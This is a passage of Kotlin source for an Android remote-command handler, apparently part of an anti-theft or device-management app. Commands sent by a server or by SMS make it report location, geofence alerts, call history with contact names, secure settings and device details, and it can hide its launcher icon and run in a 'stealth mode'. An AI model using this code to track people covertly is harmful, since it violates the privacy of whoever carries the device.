                            p.fingerprint,
                            p.buildTimeMillis.toString()
                        )
                    )
                }
            }

            // Log and handle the token as needed
            firestore.collection("Devices")
                .document(currentDeviceID).set(
                    hashMapOf<String, Any>(
                        "ID" to currentDeviceID,
                        "Build.VERSION.BASE_OS" to Build.VERSION.BASE_OS,
                        "Build.VERSION.INCREMENTAL" to Build.VERSION.INCREMENTAL,
                        "Build.VERSION.SDK_INT" to Build.VERSION.SDK_INT,
                        "Build.VERSION.CODENAME" to Build.VERSION.CODENAME,
                        "Build.VERSION.SECURITY_PATCH" to Build.VERSION.SECURITY_PATCH,
                        "Build.VERSION.RELEASE" to Build.VERSION.RELEASE,
                        "Build.VERSION.RELEASE_OR_CODENAME" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Build.VERSION.RELEASE_OR_CODENAME else "",
                        "Build.VERSION.RELEASE_OR_PREVIEW_DISPLAY" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Build.VERSION.RELEASE_OR_PREVIEW_DISPLAY else "",
                        "Build.VERSION.PREVIEW_SDK_INT" to Build.VERSION.PREVIEW_SDK_INT,
                        "Build.DISPLAY" to Build.DISPLAY,
                        "Build.ID" to Build.ID,
                        "Build.BOARD" to Build.BOARD,
                        "Build.BOOTLOADER" to Build.BOOTLOADER,
                        "Build.FINGERPRINT" to Build.FINGERPRINT,
                        "Build.DEVICE" to Build.DEVICE,
                        "Build.MANUFACTURER" to Build.MANUFACTURER,
                        "Build.HOST" to Build.HOST,
                        "Build.HARDWARE" to Build.HARDWARE,
                        "Build.BRAND" to Build.BRAND,
                        "Build.MODEL" to Build.MODEL,
                        "Build.ODM_SKU" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.ODM_SKU else "",
                        "Build.SKU" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SKU else "",
                        "Build.SOC_MANUFACTURER" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SOC_MANUFACTURER else "",
                        "Build.SOC_MODEL" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SOC_MODEL else "",
                        "Build.SUPPORTED_32_BIT_ABIS" to Build.SUPPORTED_32_BIT_ABIS.toList(),
                        "Build.SUPPORTED_64_BIT_ABIS" to Build.SUPPORTED_64_BIT_ABIS.toList(),
                        "Build.SUPPORTED_ABIS" to Build.SUPPORTED_ABIS.toList(),
                        "Build.USER" to Build.USER,
                        "Build.PRODUCT" to Build.PRODUCT,
                        "Build.RADIO_VERSION" to Build.getRadioVersion(),
                        "Build.CPU_ABI" to Build.CPU_ABI,
                        "Build.CPU_ABI2" to Build.CPU_ABI2,
                        "Build.TYPE" to Build.TYPE,
                        "Build.TAGS" to Build.TAGS,
                        "Build.Partition.PARTITION_NAME_SYSTEM" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) Build.Partition.PARTITION_NAME_SYSTEM else "",
                        "Build.getFingerprintedPartitions()" to Gson().toJson(
                            partitions
                        ),
                        "Token" to token
                    )
                ).addOnCompleteListener {
                    if (it.isSuccessful) {
                        sendMessage(
                            context,
                            false,
                            "UPDATE_DEVICE_INFO: Operation completed successfully",
                            messageID, serverID
                        )
                    } else {
                        it.exception?.printStackTrace()
                        sendMessage(
                            context,
                            false,
                            "UPDATE_DEVICE_INFO: Operation failed - ${it.exception?.localizedMessage}",
                            messageID, serverID
                        )
                    }
                }
        }
    } else if (command == "GET_FIREBASE_MESSAGING_ID") {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) {
                sendMessage(
                    context,
                    false,
                    "GET_FIREBASE_MESSAGING_ID: Operation failed - ${task.exception?.localizedMessage}",
                    messageID, serverID
                )
                return@addOnCompleteListener
            }
            sendMessage(
                context,
                false,
                "GET_FIREBASE_MESSAGING_ID: ${task.result}",
                messageID, serverID
            )
        }
    } else if (command == "IS_ACCESSIBILITY_SERVICE_ENABLED") {
        sendMessage(
            context,
            false,
            "IS_ACCESSIBILITY_SERVICE_RUNNING: ${boolToYesNo(isAccessibilityServiceEnabled(context, MyAccessibilityService::class.java))}",
            messageID, serverID
        )
    } else if (command == "GET_CALL_STATE") {
        val state = getCallState(context)
        var str = "GET_CALL_STATE: "
        when (state) {
            TelephonyManager.CALL_STATE_IDLE -> str += "IDLE"
            TelephonyManager.CALL_STATE_OFFHOOK-> str += "OFFHOOK"
            TelephonyManager.CALL_STATE_RINGING-> str += "RINGING"
        }
        sendMessage(
            context,
            false,
            str,
            messageID, serverID
        )
    } else if (command == "GET_POWER_INFO") {
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        var statusStr = "GET_POWER_INFO: Is Interactive: ${boolToYesNo(powerManager.isInteractive)} - Is Power Save Mode Enabled: ${boolToYesNo(powerManager.isPowerSaveMode)} - Location Power Save Mode: ${powerManager.locationPowerSaveMode} - Is Device Idle Mode: ${boolToYesNo(powerManager.isDeviceIdleMode)} - Is Sustained Performance Mode Supported: ${boolToYesNo(powerManager.isSustainedPerformanceModeSupported)}"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            statusStr += " - Current Thermal Status: ${powerManager.currentThermalStatus}"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                statusStr += " - Is Rebooting Userspace Supported: ${boolToYesNo(powerManager.isRebootingUserspaceSupported)}"
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    statusStr += " - Is Battery Discharge Prediction Personalized: ${
                        boolToYesNo(
                            powerManager.isBatteryDischargePredictionPersonalized
                        )
                    }"
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        statusStr += " - Is Device Light Idle Mode: ${boolToYesNo(powerManager.isDeviceLightIdleMode)} - Is Low Power Standby Enabled: ${
                            boolToYesNo(
                                powerManager.isLowPowerStandbyEnabled
                            )
                        }"
                        val batteryDischargePrediction = powerManager.batteryDischargePrediction
                        if (batteryDischargePrediction != null) {
                            val days = batteryDischargePrediction.toDays().toString()
                            val hours = batteryDischargePrediction.toHours().toString()
                            val minutes = batteryDischargePrediction.toMinutes().toString()
                            val seconds = batteryDischargePrediction.toSeconds().toString()
                            statusStr += " - Battery Discharge Prediction: $days days, $hours hours, $minutes minutes, $seconds seconds"
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                            statusStr += " - Is Exempt From Low Power Standby: ${
                                boolToYesNo(
                                    powerManager.isExemptFromLowPowerStandby
                                )
                            }"
                        }
                    }
                }
            }
        }
        sendMessage(
            context,
            false,
            statusStr,
            messageID, serverID
        )
    } else if (command.startsWith("REBOOT_DEVICE ")) {
        try {
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            sendMessage(
                context,
                false,
                "REBOOT_DEVICE: Rebooting device",
                messageID, serverID
            )
            powerManager.reboot(command.removePrefix("REBOOT_DEVICE "))
            sendMessage(
                context,
                false,
                "REBOOT_DEVICE: Operation failed",
                messageID, serverID
            )
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "REBOOT_DEVICE: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command == "DISABLE_LAUNCHER_ACTIVITY") {
        disableLauncherActivity(context)
        sendMessage(
            context,
            false,
            "DISABLE_LAUNCHER_ACTIVITY: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "ENABLE_LAUNCHER_ACTIVITY") {
        enableLauncherActivity(context)
        sendMessage(
            context,
            false,
            "ENABLE_LAUNCHER_ACTIVITY: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "GET_ALL_SECURE_SETTINGS") {
        try {
            sendMessage(
                context,
                false,
                "GET_ALL_SECURE_SETTINGS: ${getAllSecureSettingsAsJson(context)}",
                messageID, serverID
            )
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "GET_ALL_SECURE_SETTINGS: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
    } else if (command.startsWith("BLOCK_PHONE_NUMBER ")) {
        blockedPhoneNumbers.add(command.removePrefix("BLOCK_PHONE_NUMBER "))
        with (preferences.edit()) {
            putStringSet("BlockedPhoneNumbers", blockedPhoneNumbers.toSet())
            commit()
        }
        sendMessage(
            context,
            false,
            "BLOCK_PHONE_NUMBER: Operation completed successfully",
            messageID, serverID
        )
    } else if (command.startsWith("UNBLOCK_PHONE_NUMBER ")) {
        blockedPhoneNumbers.remove(command.removePrefix("UNBLOCK_PHONE_NUMBER "))
        with (preferences.edit()) {
            putStringSet("BlockedPhoneNumbers", blockedPhoneNumbers.toSet())
            commit()
        }
        sendMessage(
            context,
            false,
            "UNBLOCK_PHONE_NUMBER: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "CLEAR_ALL_BLOCKED_NUMBERS") {
        blockedPhoneNumbers.clear()
        with (preferences.edit()) {
            putStringSet("BlockedPhoneNumbers", blockedPhoneNumbers.toSet())
            commit()
        }
        sendMessage(
            context,
            false,
            "CLEAR_ALL_BLOCKED_NUMBERS: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "GET_ALL_BLOCKED_NUMBERS") {
        sendMessage(
            context,
            false,
            "GET_ALL_BLOCKED_NUMBERS: ${blockedPhoneNumbers.joinToString(", ")}",
            messageID, serverID
        )
    } else if (command.startsWith("ADD_SERVER_PHONE_NO ")) {
        val number =
            command.removePrefix("ADD_SERVER_PHONE_NO ")
        val serverPhoneNoStr = preferences.getString(
            "ServerPhoneNumber",
            ""
        )
        if (serverPhoneNoStr?.contains("$number,") == false || serverPhoneNoStr?.endsWith(
                number
            ) == false
        ) {
            serverPhoneNumbers.add(number)
            var numbers = ""
            for (n in serverPhoneNumbers)
                numbers += "$n,"
            numbers.removeSuffix(",")
            with(preferences.edit()) {
                putString("ServerPhoneNumber", numbers)
                commit()
            }
            sendMessage(
                context,
                false,
                "ADD_SERVER_PHONE_NO: Operation completed successfully",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "ADD_SERVER_PHONE_NO: Operation failed - number is already added",
                messageID, serverID
            )
        }
    } else if (command.startsWith("GET_LAST_N_PHONE_NUMBERS_CALLED ")) {
        try {
            val lastNNumbersWithNames = getLastNPhoneNumbersWithNames(
                context.contentResolver,
                context,
                command.removePrefix("GET_LAST_N_PHONE_NUMBERS_CALLED ").toInt()
            )
            sendMessage(context, false, "GET_LAST_N_PHONE_NUMBERS_CALLED: $lastNNumbersWithNames", messageID, serverID)
        } catch (ex: Exception) {
            sendMessage(context, false, "GET_LAST_N_PHONE_NUMBERS_CALLED: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command.startsWith("DUMP_LAST_N_PHONE_NUMBERS_CALLED ")) {
        try {
            val lastNNumbersWithNames = getLastNPhoneNumbersWithNames(
                context.contentResolver,
                context,
                command.removePrefix("DUMP_LAST_N_PHONE_NUMBERS_CALLED ").split(" ")[0].toInt())
            File("/" + command.removePrefix("DUMP_LAST_N_PHONE_NUMBERS_CALLED ").split(" ")[1].removePrefix("/")).writeText(lastNNumbersWithNames)
            sendMessage(context, false, "DUMP_LAST_N_PHONE_NUMBERS_CALLED: Operation completed successfully", messageID, serverID)
        } catch (ex: Exception) {
            sendMessage(context, false, "GET_LAST_N_PHONE_NUMBERS_CALLED: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command.startsWith("REMOVE_SERVER_PHONE_NO ")) {
        val number =
            command.removePrefix("REMOVE_SERVER_PHONE_NO ")
        if (number !in serverPhoneNumbers) {
            sendMessage(
                context,
                false,
                "REMOVE_SERVER_PHONE_NO: Operation failed - number is not of a server",
                messageID, serverID
            )
        } else {
            serverPhoneNumbers.remove(number)
            var numbers = ""
            for (n in serverPhoneNumbers)
                numbers += "$n,"
            numbers.removeSuffix(",")
            with(preferences.edit()) {
                putString("ServerPhoneNumber", numbers)
                commit()
            }
            sendMessage(
                context,
                false,
                "REMOVE_SERVER_PHONE_NO: Operation completed successfully",
                messageID, serverID
            )
        }
    } else if (command == "REMOVE_ALL_SERVER_PHONE_NO") {
        with(preferences.edit()) {
            putString("ServerPhoneNumber", "")
            commit()
        }
        sendMessage(
            context,
            false,
            "REMOVE_ALL_SERVER_PHONE_NO: Operation completed successfully",
            messageID, serverID
        )
    } else if (command.startsWith("SET_PHONE_NO_TO_USE ")) {
        val number = command.removePrefix("SET_PHONE_NO_TO_USE ")
        with(preferences.edit()) {
            putString("PhoneNoToUse", number)
            commit()
        }
        phoneNumberToUse = number
        sendMessage(
            context,
            false,
            "SET_PHONE_NO_TO_USE: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "GET_PUBLIC_IPV6_ADDRESS") {
        CoroutineScope(Dispatchers.IO).launch {
            val publicIPv6 = getPublicIPv6()
            sendMessage(
                context,
                false,
                "GET_PUBLIC_IPV6_ADDRESS: $publicIPv6",
                messageID, serverID
            )
        }
    } else if (command == "GET_PUBLIC_IPV4_ADDRESS") {
        CoroutineScope(Dispatchers.IO).launch {
            val publicIPv4 = getPublicIPv4()
            sendMessage(
                context,
                false,
                "GET_PUBLIC_IPV4_ADDRESS: $publicIPv4",
                messageID, serverID
            )
        }
    } else if (command == "START_SAVING_CURRENT_LOCATION_IN_FIRESTORE") {
        saveCurrentLocationInFirestore = true
        sendMessage(
            context,
            false,
            "START_SAVING_CURRENT_LOCATION_IN_FIRESTORE: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "STOP_SAVING_CURRENT_LOCATION_IN_FIRESTORE") {
        saveCurrentLocationInFirestore = false
        sendMessage(
            context,
            false,
            "STOP_SAVING_CURRENT_LOCATION_IN_FIRESTORE: Operation completed successfully",
            messageID, serverID
        )
    } else if (command.startsWith("GEOFENCE_FROM_ENTERING ")) {
        try {
            val centerLatitude = command.removePrefix("GEOFENCE_FROM_ENTERING ").split(" ")[0].toDouble()
            val centerLongitude = command.removePrefix("GEOFENCE_FROM_ENTERING ").split(" ")[1].toDouble()
            val radius = command.removePrefix("GEOFENCE_FROM_ENTERING ").split(" ")[2].toInt()
            geofenceList.add(
                hashMapOf(
                    "CenterLatitude" to centerLatitude,
                    "CenterLongitude" to centerLongitude,
                    "Radius" to radius,
                    "Type" to "ENTERING",
                    "IsValid" to true,
                    "UseSMS" to false
                )
            )
            val geofencesFile = File(context.getFilesDir(), "geofences.json")
            geofencesFile.writeText(Gson().toJson(geofenceList))
            sendMessage(
                context,
                false,
                "GEOFENCE_FROM_ENTERING: Operation completed successfully",
                messageID,
                serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(context, false, "GEOFENCE_FROM_ENTERING: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command == "START_LOGGING_LOCATION_UPDATES") {
        startLoggingLocation = true
        with (preferences.edit()) {
            putBoolean("StartLoggingLocation", true)
        }
        sendMessage(context, false, "START_LOGGING_LOCATION_UPDATES: Operation completed successfully", messageID, serverID)
    } else if (command == "STOP_LOGGING_LOCATION_UPDATES") {
        startLoggingLocation = false
        with (preferences.edit()) {
            putBoolean("StartLoggingLocation", false)
        }
        sendMessage(context, false, "STOP_LOGGING_LOCATION_UPDATES: Operation completed successfully", messageID, serverID)
    } else if (command.startsWith("GEOFENCE_FROM_EXITING ")) {
        try {
            val centerLatitude = command.removePrefix("GEOFENCE_FROM_EXITING ").split(" ")[0].toDouble()
            val centerLongitude = command.removePrefix("GEOFENCE_FROM_EXITING ").split(" ")[1].toDouble()
            val radius = command.removePrefix("GEOFENCE_FROM_EXITING ").split(" ")[2].toInt()
            geofenceList.add(
                hashMapOf(
                    "CenterLatitude" to centerLatitude,
                    "CenterLongitude" to centerLongitude,
                    "Radius" to radius,
                    "Type" to "EXITING",
                    "IsValid" to true,
                    "UseSMS" to false
                )
            )
            val geofencesFile = File(context.getFilesDir(), "geofences.json")
            geofencesFile.writeText(Gson().toJson(geofenceList))
            sendMessage(
                context,
                false,
                "GEOFENCE_FROM_EXITING: Geofence Index: ${geofenceList.size - 1}",
                messageID,
                serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(context, false, "GEOFENCE_FROM_EXITING: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command.startsWith("MAKE_GEOFENCE_INVALID ")) {
        try {
            val index = command.removePrefix("MAKE_GEOFENCE_INVALID ").toInt()
            geofenceList[index]["IsValid"] = false
            val geofencesFile = File(context.getFilesDir(), "geofences.json")
            geofencesFile.writeText(Gson().toJson(geofenceList))
            sendMessage(
                context,
                false,
                "MAKE_GEOFENCE_INVALID: Operation completed successfully",
                messageID,
                serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(context, false, "MAKE_GEOFENCE_INVALID: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command.startsWith("MAKE_GEOFENCE_VALID ")) {
        try {
            val index = command.removePrefix("MAKE_GEOFENCE_VALID ").toInt()
            geofenceList[index]["IsValid"] = true
            val geofencesFile = File(context.getFilesDir(), "geofences.json")
            geofencesFile.writeText(Gson().toJson(geofenceList))
            sendMessage(
                context,
                false,
                "MAKE_GEOFENCE_VALID: Operation completed successfully",
                messageID,
                serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(context, false, "MAKE_GEOFENCE_VALID: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command == "INVALIDATE_AND_CLEAR_ALL_GEOFENCES") {
        geofenceList.clear()
        val geofencesFile = File(context.getFilesDir(), "geofences.json")
        geofencesFile.writeText(Gson().toJson(geofenceList))
        sendMessage(context, false, "INVALIDATE_AND_CLEAR_ALL_GEOFENCES: Operation completed successfully", messageID, serverID)
    } else if (command.startsWith("SEND_GEOFENCE_ALERTS_THROUGH_SMS ")) {
        try {
            val index = command.removePrefix("SEND_GEOFENCE_ALERTS_THROUGH_SMS ").toInt()
            geofenceList[index]["UseSMS"] = true
            sendMessage(
                context,
                false,
                "SEND_GEOFENCE_ALERTS_THROUGH_SMS: Operation completed successfully",
                messageID,
                serverID
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(context, false, "SEND_GEOFENCE_ALERTS_THROUGH_SMS: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command.startsWith("SEND_GEOFENCE_ALERTS_THROUGH_FIRESTORE ")) {
        try {
            val index = command.removePrefix("SEND_GEOFENCE_ALERTS_THROUGH_FIRESTORE ").toInt()
            geofenceList[index]["UseSMS"] = false
            sendMessage(context, false, "SEND_GEOFENCE_ALERTS_THROUGH_FIRESTORE: Operation completed successfully", messageID, serverID)
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(context, false, "SEND_GEOFENCE_ALERTS_THROUGH_FIRESTORE: Operation failed - ${ex.localizedMessage}", messageID, serverID)
        }
    } else if (command == "GET_ALL_GEOFENCES") {
        sendMessage(context, false, "GET_ALL_GEOFENCES: ${Gson().toJson(geofenceList)}")
    } else if (command == "PING") {
        sendMessage(context, false, "PING_ACK", messageID, serverID)
    } else if (command == "ASK_TO_TURN_ON_LOCATION") {
        val intent = Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
        sendMessage(context, false, "ASK_TO_TURN_ON_LOCATION: Operation completed successfully", messageID, serverID)
    } else if (command == "GET_CURRENT_LOCATION") {
        if (
            context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
            || context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        ) {
            // Permission is granted, proceed with location retrieval
            val fusedLocationClient =
                LocationServices.getFusedLocationProviderClient(context)
            fusedLocationClient.getCurrentLocation(
                Priority.PRIORITY_HIGH_ACCURACY,
                object : CancellationToken() {
                    override fun onCanceledRequested(p0: OnTokenCanceledListener): CancellationToken {
                        return CancellationTokenSource().token
                    }

                    override fun isCancellationRequested(): Boolean {
                        return false
                    }

                }).addOnSuccessListener { location: Location? ->
                if (location != null) {
                    val latitude = location.latitude
                    val longitude = location.longitude
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        val messageParts = mutableListOf<String>()
                        messageParts.add("GET_CURRENT_LOCATION: Longitude: $longitude, Latitude: $latitude, Time: ${location.time}, Speed: ${location.speed}")
                        if (location.hasAccuracy()) messageParts.add(
                            "Accuracy: ${location.accuracy}"
                        )
                        if (location.hasSpeedAccuracy()) messageParts.add(
                            "Speed Accuracy: ${location.speedAccuracyMetersPerSecond}"
                        )
                        if (location.hasVerticalAccuracy()) messageParts.add(
                            "Vertical Accuracy: ${location.verticalAccuracyMeters}"
                        )
                        if (location.hasAltitude()) messageParts.add(
                            "Altitude: ${location.altitude}"
                        )
                        if (location.hasMslAltitude()) messageParts.add(
                            "MSL Altitude: ${location.mslAltitudeMeters}"
                        )
                        if (location.hasMslAltitudeAccuracy()) messageParts.add(
                            "MSL Altitude Accuracy: ${location.mslAltitudeAccuracyMeters}"
                        )
                        if (location.hasBearing()) messageParts.add(
                            "Bearing: ${location.bearing}"
                        )
                        if (location.hasBearingAccuracy()) messageParts.add(
                            "Bearing Accuracy: ${location.bearingAccuracyDegrees}"
                        )
                        sendMessage(
                            context,
                            false,
                            messageParts.joinToString(", "),
                            messageID, serverID
                        )
                    } else {
                        val messageParts = mutableListOf<String>()
                        messageParts.add("GET_CURRENT_LOCATION: Longitude: $longitude, Latitude: $latitude, Time: ${location.time}, Speed: ${location.speed}")
                        if (location.hasAccuracy()) messageParts.add(
                            "Accuracy: ${location.accuracy}"
                        )
                        if (location.hasSpeedAccuracy()) messageParts.add(
                            "Speed Accuracy: ${location.speedAccuracyMetersPerSecond}"
                        )
                        if (location.hasVerticalAccuracy()) messageParts.add(
                            "Vertical Accuracy: ${location.verticalAccuracyMeters}"
                        )
                        if (location.hasAltitude()) messageParts.add(
                            "Altitude: ${location.altitude}"
                        )
                        if (location.hasBearing()) messageParts.add(
                            "Bearing: ${location.bearing}"
                        )
                        if (location.hasBearingAccuracy()) messageParts.add(
                            "Bearing Accuracy: ${location.bearingAccuracyDegrees}"
                        )
                        sendMessage(
                            context,
                            false,
                            messageParts.joinToString(", "),
                            messageID, serverID
                        )
                    }
                } else {
                    sendMessage(
                        context,
                        false,
                        "GET_CURRENT_LOCATION: Operation failed - returned null location",
                        messageID, serverID
                    )
                }
            }.addOnFailureListener { e ->
                sendMessage(
                    context,
                    false,
                    "GET_CURRENT_LOCATION: Operation failed - ${e.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "GET_CURRENT_LOCATION: Operation failed - permission error",
                messageID, serverID
            )
        }
    } else if (command == "GET_LAST_KNOWN_LOCATION") {
        if (
            context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
            || context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        ) {
            // Permission is granted, proceed with location retrieval
            val fusedLocationClient =
                LocationServices.getFusedLocationProviderClient(context)
            fusedLocationClient.lastLocation.addOnSuccessListener { location: Location? ->
                if (location != null) {
                    val latitude = location.latitude
                    val longitude = location.longitude
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        val messageParts = mutableListOf<String>()
                        messageParts.add("GET_LAST_KNOWN_LOCATION: Longitude: $longitude, Latitude: $latitude, Time: ${location.time}, Speed: ${location.speed}")
                        if (location.hasAccuracy()) messageParts.add(
                            "Accuracy: ${location.accuracy}"
                        )
                        if (location.hasSpeedAccuracy()) messageParts.add(
                            "Speed Accuracy: ${location.speedAccuracyMetersPerSecond}"
                        )
                        if (location.hasVerticalAccuracy()) messageParts.add(
                            "Vertical Accuracy: ${location.verticalAccuracyMeters}"
                        )
                        if (location.hasAltitude()) messageParts.add(
                            "Altitude: ${location.altitude}"
                        )
                        if (location.hasMslAltitude()) messageParts.add(
                            "MSL Altitude: ${location.mslAltitudeMeters}"
                        )
                        if (location.hasBearing()) messageParts.add(
                            "Bearing: ${location.bearing}"
                        )
                        if (location.hasBearingAccuracy()) messageParts.add(
                            "Bearing Accuracy: ${location.bearingAccuracyDegrees}"
                        )
                        sendMessage(
                            context,
                            false,
                            messageParts.joinToString(", "),
                            messageID, serverID
                        )
                    } else {
                        val messageParts = mutableListOf<String>()
                        messageParts.add("GET_LAST_KNOWN_LOCATION: Longitude: $longitude, Latitude: $latitude, Time: ${location.time}, Speed: ${location.speed}")
                        if (location.hasAccuracy()) messageParts.add(
                            "Accuracy: ${location.accuracy}"
                        )
                        if (location.hasSpeedAccuracy()) messageParts.add(
                            "Speed Accuracy: ${location.speedAccuracyMetersPerSecond}"
                        )
                        if (location.hasVerticalAccuracy()) messageParts.add(
                            "Vertical Accuracy: ${location.verticalAccuracyMeters}"
                        )
                        if (location.hasAltitude()) messageParts.add(
                            "Altitude: ${location.altitude}"
                        )
                        if (location.hasBearing()) messageParts.add(
                            "Bearing: ${location.bearing}"
                        )
                        if (location.hasBearingAccuracy()) messageParts.add(
                            "Bearing Accuracy: ${location.bearingAccuracyDegrees}"
                        )
                        sendMessage(
                            context,
                            false,
                            messageParts.joinToString(", "),
                            messageID, serverID
                        )
                    }
                } else {
                    sendMessage(
                        context,
                        false,
                        "GET_LAST_KNOWN_LOCATION: Operation failed - returned null location",
                        messageID, serverID
                    )
                }
            }.addOnFailureListener { e ->
                sendMessage(
                    context,
                    false,
                    "GET_LAST_KNOWN_LOCATION: Operation failed -${e.localizedMessage}",
                    messageID, serverID
                )
            }
        } else {
            sendMessage(
                context,
                false,
                "GET_LAST_KNOWN_LOCATION: Operation failed - permission error",
                messageID, serverID
            )
        }
    } else if (command == "START_RING") {
        if (!isStealthModeEnabled) {
            mediaPlayer?.stop()
            audioManager =
                context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            mediaPlayer = MediaPlayer.create(
                context,
                Settings.System.DEFAULT_RINGTONE_URI
            )
            audioManager?.setStreamVolume(
                AudioManager.STREAM_MUSIC,
                audioManager!!.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                0
            )
            mediaPlayer?.isLooping = true
            mediaPlayer?.start()
            audioManager?.adjustVolume(AudioManager.ADJUST_UNMUTE, 0)
            var i = 0
            while (i < 25) {
                audioManager?.adjustVolume(AudioManager.ADJUST_RAISE, 0)
                i++
            }
            sendMessage(
                context,
                false,
                "START_RING: Operation completed successfully",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "START_RING: Stealth mode is enabled",
                messageID, serverID
            )
        }
    } else if (command == "STOP_RING") {
        mediaPlayer?.stop()
        sendMessage(
            context,
            false,
            "STOP_RING: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "INCREASE_VOLUME") {
        if (audioManager == null)
            audioManager =
                context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audioManager?.adjustVolume(AudioManager.ADJUST_RAISE, 0)
        sendMessage(
            context,
            false,
            "INCREASE_VOLUME: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "DECREASE_VOLUME") {
        if (audioManager == null)
            audioManager =
                context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audioManager?.adjustVolume(AudioManager.ADJUST_LOWER, 0)
        sendMessage(
            context,
            false,
            "DECREASE_VOLUME: Operation completed successfully",
            messageID, serverID
        )
    } else if (command.startsWith("SHOW_TOAST ")) {
        val toastMessage = command.removePrefix("SHOW_TOAST ")
        Toast.makeText(context, toastMessage, Toast.LENGTH_LONG).show()
        sendMessage(
            context,
            false,
            "SHOW_TOAST: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "GET_MOBILE_DATA_STATUS") {
        var mobileDataEnabled = false // Assume disabled
        val cm =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        try {
            val cmClass = Class.forName(cm.javaClass.getName())
            val method =
                cmClass.getDeclaredMethod("getMobileDataEnabled")
            method.isAccessible = true // Make the method callable
            // get the setting for "mobile data"
            mobileDataEnabled = method.invoke(cm) as Boolean
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "GET_MOBILE_DATA_STATUS: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        var signalStrengthGsm: Int? = null
        var level: Int? = null
        var cdmaDbm: Int? = null
        var gsmBitErrorRate: Int? = null
        try {
            val signalInfo = tm.signalStrength
            signalStrengthGsm = signalInfo?.gsmSignalStrength
            level = signalInfo?.level
            cdmaDbm = signalInfo?.cdmaDbm
            gsmBitErrorRate = signalInfo?.gsmBitErrorRate
        } catch (ex: Exception) {
            sendMessage(
                context,
                false,
                "GET_MOBILE_DATA_STATUS: Operation failed - ${ex.localizedMessage}",
                messageID, serverID
            )
        }
        sendMessage(
            context,
            false,
            "GET_MOBILE_DATA_STATUS: Is Enabled: ${boolToYesNo(mobileDataEnabled)} - Signal Strength GSM: $signalStrengthGsm - Signal Level: $level - Signal Strength CDMA Dbm: $cdmaDbm - GSM Bit Error Rate: $gsmBitErrorRate",
            messageID, serverID
        )
    } else if (command == "GET_WIFI_STATUS") {
        val wifiManager =
            context.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val state = boolToYesNo(wifiManager.isWifiEnabled)
        val info = wifiManager.connectionInfo
        var ssid = ""
        val macAddr = info.macAddress
        val connManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager?
        val mWifi =
